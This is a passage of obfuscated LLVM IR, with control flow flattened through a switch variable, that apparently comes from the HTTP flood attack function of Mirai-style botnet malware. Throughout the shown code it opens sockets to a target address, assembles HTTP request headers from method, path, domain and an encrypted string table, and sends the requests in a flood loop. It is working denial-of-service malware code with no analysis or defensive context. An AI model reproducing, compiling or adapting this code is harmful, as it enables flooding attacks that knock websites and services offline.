  %460 = call i32 @setsockopt(i32 %458, i32 0, i32 8, i8* %459, i32 4) #6
  %461 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %461, align 4
  %462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %462, i32 0, i32 4
  %464 = load i32, i32* %463, align 4
  %465 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %466 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %465, i32 0, i32 0
  store i32 %464, i32* %466, align 4
  %467 = load i16, i16* %19, align 2
  %468 = call zeroext i16 @htons(i16 zeroext %467) #7
  %469 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %468, i16* %469, align 2
  %470 = load i32, i32* %27, align 4
  %471 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %471, i32 0, i32 2
  store i32 %470, i32* %472, align 4
  %473 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %473, i32 0, i32 1
  store i8 2, i8* %474, align 4
  %475 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 4
  %478 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %479 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %479, %struct.sockaddr** %478, align 8
  %480 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %481 = load %struct.sockaddr*, %struct.sockaddr** %480, align 8
  %482 = call i32 @connect(i32 %477, %struct.sockaddr* %481, i32 16)
  %483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %483, i32 0, i32 0
  %485 = load i32, i32* %484, align 4
  %486 = srem i32 %485, 64
  %487 = zext i32 %486 to i64
  %488 = shl i64 1, %487
  %489 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %490 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %491 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %490, i32 0, i32 0
  %492 = load i32, i32* %491, align 4
  %493 = sdiv i32 %492, 64
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds [16 x i64], [16 x i64]* %489, i64 0, i64 %494
  %496 = load i64, i64* %495, align 8
  %497 = or i64 %496, %488
  store i64 %497, i64* %495, align 8
  %498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 4
  %501 = load i32, i32* %23, align 4
  %502 = icmp sgt i32 %500, %501
  %503 = select i1 %502, i32 -1323643040, i32 -412137295
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 4
  %508 = add nsw i32 %507, 1
  store i32 %508, i32* %23, align 4
  store i32 -412137295, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  store i32 -1577572110, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  %511 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %512 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %511, i32 0, i32 1
  %513 = load i8, i8* %512, align 4
  %514 = zext i8 %513 to i32
  %515 = icmp eq i32 %514, 2
  %516 = select i1 %515, i32 -430703330, i32 1494148204
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  %518 = load i32, i32* %27, align 4
  %519 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %520 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %519, i32 0, i32 2
  %521 = load i32, i32* %520, align 4
  %522 = sub i32 %518, %521
  %523 = icmp ugt i32 %522, 30
  %524 = select i1 %523, i32 1332994091, i32 -1881495417
  store i32 %524, i32* %switchVar
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  %526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %526, i32 0, i32 1
  store i8 0, i8* %527, align 4
  %528 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %529 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 4
  %531 = call i32 @close(i32 %530)
  %532 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %532, i32 0, i32 0
  store i32 -1, i32* %533, align 4
  store i32 792116999, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 4
  %538 = srem i32 %537, 64
  %539 = zext i32 %538 to i64
  %540 = shl i64 1, %539
  %541 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %542 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %542, i32 0, i32 0
  %544 = load i32, i32* %543, align 4
  %545 = sdiv i32 %544, 64
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds [16 x i64], [16 x i64]* %541, i64 0, i64 %546
  %548 = load i64, i64* %547, align 8
  %549 = or i64 %548, %540
  store i64 %549, i64* %547, align 8
  %550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 4
  %553 = load i32, i32* %23, align 4
  %554 = icmp sgt i32 %552, %553
  %555 = select i1 %554, i32 1806642823, i32 770856625
  store i32 %555, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i32 0, i32 0
  %559 = load i32, i32* %558, align 4
  %560 = add nsw i32 %559, 1
  store i32 %560, i32* %23, align 4
  store i32 770856625, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  store i32 646044068, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %563, i32 0, i32 1
  %565 = load i8, i8* %564, align 4
  %566 = zext i8 %565 to i32
  %567 = icmp eq i32 %566, 4
  %568 = select i1 %567, i32 1441256007, i32 -81539275
  store i32 %568, i32* %switchVar
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %571 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %570, i32 0, i32 14
  store i32 -1, i32* %571, align 4
  %572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %572, i32 0, i32 11
  store i32 0, i32* %573, align 4
  %574 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %574, i32 0, i32 18
  %576 = getelementptr inbounds [1024 x i8], [1024 x i8]* %575, i32 0, i32 0
  call void @util_zero(i8* %576, i32 1024)
  %577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %577, i32 0, i32 17
  store i32 0, i32* %578, align 4
  %579 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %579, i32 10240)
  %580 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %581 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %582 = call i32 @util_strlen(i8* %581)
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds i8, i8* %580, i64 %583
  %585 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %585, i32 0, i32 9
  %587 = getelementptr inbounds [9 x i8], [9 x i8]* %586, i32 0, i32 0
  %588 = call i32 @util_strcpy(i8* %584, i8* %587)
  %589 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %590 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %591 = call i32 @util_strlen(i8* %590)
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds i8, i8* %589, i64 %592
  %594 = call i32 @util_strcpy(i8* %593, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %595 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %596 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %597 = call i32 @util_strlen(i8* %596)
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds i8, i8* %595, i64 %598
  %600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %600, i32 0, i32 6
  %602 = getelementptr inbounds [257 x i8], [257 x i8]* %601, i32 0, i32 0
  %603 = call i32 @util_strcpy(i8* %599, i8* %602)
  %604 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %605 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %606 = call i32 @util_strlen(i8* %605)
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds i8, i8* %604, i64 %607
  %609 = call i32 @util_strcpy(i8* %608, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %610 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %611 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %612 = call i32 @util_strlen(i8* %611)
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds i8, i8* %610, i64 %613
  %615 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %616 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %615, i32 0, i32 5
  %617 = getelementptr inbounds [512 x i8], [512 x i8]* %616, i32 0, i32 0
  %618 = call i32 @util_strcpy(i8* %614, i8* %617)
  %619 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %620 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %621 = call i32 @util_strlen(i8* %620)
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds i8, i8* %619, i64 %622
  %624 = call i32 @util_strcpy(i8* %623, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %625 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %626 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %627 = call i32 @util_strlen(i8* %626)
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds i8, i8* %625, i64 %628
  %630 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %630, i32 0, i32 7
  %632 = getelementptr inbounds [129 x i8], [129 x i8]* %631, i32 0, i32 0
  %633 = call i32 @util_strcpy(i8* %629, i8* %632)
  %634 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %635 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %636 = call i32 @util_strlen(i8* %635)
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds i8, i8* %634, i64 %637
  %639 = call i32 @util_strcpy(i8* %638, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 48)
  %640 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %641 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %642 = call i32 @util_strlen(i8* %641)
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds i8, i8* %640, i64 %643
  %645 = call i8* @table_retrieve_val(i32 48, i32* null)
  %646 = call i32 @util_strcpy(i8* %644, i8* %645)
  call void @table_lock_val(i8 zeroext 48)
  %647 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %648 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %649 = call i32 @util_strlen(i8* %648)
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds i8, i8* %647, i64 %650
  %652 = call i32 @util_strcpy(i8* %651, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 49)
  %653 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %654 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %655 = call i32 @util_strlen(i8* %654)
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds i8, i8* %653, i64 %656
  %658 = call i8* @table_retrieve_val(i32 49, i32* null)
  %659 = call i32 @util_strcpy(i8* %657, i8* %658)
  call void @table_lock_val(i8 zeroext 49)
  %660 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %661 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %662 = call i32 @util_strlen(i8* %661)
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds i8, i8* %660, i64 %663
  %665 = call i32 @util_strcpy(i8* %664, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 50)
  %666 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %667 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %668 = call i32 @util_strlen(i8* %667)
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds i8, i8* %666, i64 %669
  %671 = call i8* @table_retrieve_val(i32 50, i32* null)
  %672 = call i32 @util_strcpy(i8* %670, i8* %671)
  call void @table_lock_val(i8 zeroext 50)
  %673 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %674 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %675 = call i32 @util_strlen(i8* %674)
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds i8, i8* %673, i64 %676
  %678 = call i32 @util_strcpy(i8* %677, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %679 = load i8*, i8** %14, align 8
  %680 = icmp ne i8* %679, null
  %681 = select i1 %680, i32 123843946, i32 85504333
  store i32 %681, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 51)
  %683 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %684 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %685 = call i32 @util_strlen(i8* %684)
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds i8, i8* %683, i64 %686
  %688 = call i8* @table_retrieve_val(i32 51, i32* null)
  %689 = call i32 @util_strcpy(i8* %687, i8* %688)
  call void @table_lock_val(i8 zeroext 51)
  %690 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %691 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %692 = call i32 @util_strlen(i8* %691)
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds i8, i8* %690, i64 %693
  %695 = call i32 @util_strcpy(i8* %694, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %696 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %697 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %698 = call i32 @util_strlen(i8* %697)
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds i8, i8* %696, i64 %699
  %701 = call i8* @table_retrieve_val(i32 56, i32* null)
  %702 = call i32 @util_strcpy(i8* %700, i8* %701)
  %703 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %704 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %705 = call i32 @util_strlen(i8* %704)
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds i8, i8* %703, i64 %706
  %708 = call i32 @util_strcpy(i8* %707, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %709 = load i8*, i8** %14, align 8
  %710 = call i32 @util_strlen(i8* %709)
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = call i32 @util_strlen(i8* %712)
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds i8, i8* %711, i64 %714
  %716 = call i8* @util_itoa(i32 %710, i32 10, i8* %715)
  %717 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %718 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %719 = call i32 @util_strlen(i8* %718)
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds i8, i8* %717, i64 %720
  %722 = call i32 @util_strcpy(i8* %721, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 85504333, i32* %switchVar
  br label %loopEnd

; <label>:723:                                    ; preds = %loopEntry
  %724 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %725 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %724, i32 0, i32 15
  %726 = load i32, i32* %725, align 4
  %727 = icmp sgt i32 %726, 0
  %728 = select i1 %727, i32 154583352, i32 -763491875
  store i32 %728, i32* %switchVar
  br label %loopEnd

; <label>:729:                                    ; preds = %loopEntry
  %730 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %731 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %732 = call i32 @util_strlen(i8* %731)
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %730, i64 %733
  %735 = call i32 @util_strcpy(i8* %734, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  store i32 -1215697258, i32* %switchVar
  br label %loopEnd

; <label>:736:                                    ; preds = %loopEntry
  %737 = load i32, i32* %10, align 4
  %738 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %738, i32 0, i32 15
  %740 = load i32, i32* %739, align 4
  %741 = icmp slt i32 %737, %740
  %742 = select i1 %741, i32 -378940321, i32 1945649657
  store i32 %742, i32* %switchVar
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  %744 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %745 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %746 = call i32 @util_strlen(i8* %745)
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds i8, i8* %744, i64 %747
  %749 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %750 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %749, i32 0, i32 16
  %751 = load i32, i32* %10, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %750, i64 0, i64 %752
  %754 = getelementptr inbounds [128 x i8], [128 x i8]* %753, i32 0, i32 0
  %755 = call i32 @util_strcpy(i8* %748, i8* %754)
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %758 = call i32 @util_strlen(i8* %757)
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds i8, i8* %756, i64 %759
  %761 = call i32 @util_strcpy(i8* %760, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  store i32 1787080433, i32* %switchVar
  br label %loopEnd

; <label>:762:                                    ; preds = %loopEntry
  %763 = load i32, i32* %10, align 4
  %764 = add nsw i32 %763, 1
  store i32 %764, i32* %10, align 4
  store i32 -1215697258, i32* %switchVar
  br label %loopEnd

; <label>:765:                                    ; preds = %loopEntry
  %766 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %767 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %768 = call i32 @util_strlen(i8* %767)
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds i8, i8* %766, i64 %769
  %771 = call i32 @util_strcpy(i8* %770, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 -763491875, i32* %switchVar
  br label %loopEnd

; <label>:772:                                    ; preds = %loopEntry
  %773 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %774 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %775 = call i32 @util_strlen(i8* %774)
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds i8, i8* %773, i64 %776
  %778 = call i32 @util_strcpy(i8* %777, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %779 = load i8*, i8** %14, align 8
  %780 = icmp ne i8* %779, null
  %781 = select i1 %780, i32 -769525275, i32 528732969
  store i32 %781, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  %783 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = call i32 @util_strlen(i8* %784)
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds i8, i8* %783, i64 %786
  %788 = load i8*, i8** %14, align 8
  %789 = call i32 @util_strcpy(i8* %787, i8* %788)
  store i32 528732969, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %792 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %791, i32 0, i32 9
  %793 = getelementptr inbounds [9 x i8], [9 x i8]* %792, i32 0, i32 0
  %794 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %795 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %794, i32 0, i32 10
  %796 = getelementptr inbounds [9 x i8], [9 x i8]* %795, i32 0, i32 0
  %797 = call signext i8 @util_strcmp(i8* %793, i8* %796)
  %798 = icmp ne i8 %797, 0
  %799 = select i1 %798, i32 -1722353547, i32 -1824860601
  store i32 %799, i32* %switchVar
  br label %loopEnd

; <label>:800:                                    ; preds = %loopEntry
  %801 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %802 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %801, i32 0, i32 9
  %803 = getelementptr inbounds [9 x i8], [9 x i8]* %802, i32 0, i32 0
  %804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %804, i32 0, i32 10
  %806 = getelementptr inbounds [9 x i8], [9 x i8]* %805, i32 0, i32 0
  %807 = call i32 @util_strcpy(i8* %803, i8* %806)
  store i32 -1722353547, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %810 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 4
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %814 = call i32 @util_strlen(i8* %813)
  %815 = sext i32 %814 to i64
  %816 = call i64 @send(i32 %811, i8* %812, i64 %815, i32 16384)
  %817 = load i32, i32* %27, align 4
  %818 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %819 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %818, i32 0, i32 3
  store i32 %817, i32* %819, align 4
  %820 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %821 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %820, i32 0, i32 1
  store i8 6, i8* %821, align 4
  %822 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %823 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %822, i32 0, i32 0
  %824 = load i32, i32* %823, align 4
  %825 = srem i32 %824, 64
  %826 = zext i32 %825 to i64
  %827 = shl i64 1, %826
  %828 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %829 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %830 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 4
  %832 = sdiv i32 %831, 64
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds [16 x i64], [16 x i64]* %828, i64 0, i64 %833
  %835 = load i64, i64* %834, align 8
  %836 = or i64 %835, %827
  store i64 %836, i64* %834, align 8
  %837 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %838 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %837, i32 0, i32 0
  %839 = load i32, i32* %838, align 4
  %840 = load i32, i32* %23, align 4
  %841 = icmp sgt i32 %839, %840
  %842 = select i1 %841, i32 -694240897, i32 -1329262357
  store i32 %842, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  %844 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %845 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %844, i32 0, i32 0
  %846 = load i32, i32* %845, align 4
  %847 = add nsw i32 %846, 1
  store i32 %847, i32* %23, align 4
  store i32 -1329262357, i32* %switchVar
  br label %loopEnd

; <label>:848:                                    ; preds = %loopEntry
  store i32 -1862035464, i32* %switchVar
  br label %loopEnd

; <label>:849:                                    ; preds = %loopEntry
  %850 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %851 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %850, i32 0, i32 1
  %852 = load i8, i8* %851, align 4
  %853 = zext i8 %852 to i32
  %854 = icmp eq i32 %853, 6
  %855 = select i1 %854, i32 2047679813, i32 1935283915
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %858 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %857, i32 0, i32 0
  %859 = load i32, i32* %858, align 4
  %860 = srem i32 %859, 64
  %861 = zext i32 %860 to i64
  %862 = shl i64 1, %861
  %863 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %864 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %865 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %864, i32 0, i32 0
  %866 = load i32, i32* %865, align 4
  %867 = sdiv i32 %866, 64
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds [16 x i64], [16 x i64]* %863, i64 0, i64 %868
  %870 = load i64, i64* %869, align 8
  %871 = or i64 %870, %862
  store i64 %871, i64* %869, align 8
  %872 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %873 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %872, i32 0, i32 0
  %874 = load i32, i32* %873, align 4
  %875 = load i32, i32* %23, align 4
  %876 = icmp sgt i32 %874, %875
  %877 = select i1 %876, i32 1550671564, i32 536142275
  store i32 %877, i32* %switchVar
  br label %loopEnd

; <label>:878:                                    ; preds = %loopEntry
  %879 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %880 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %879, i32 0, i32 0
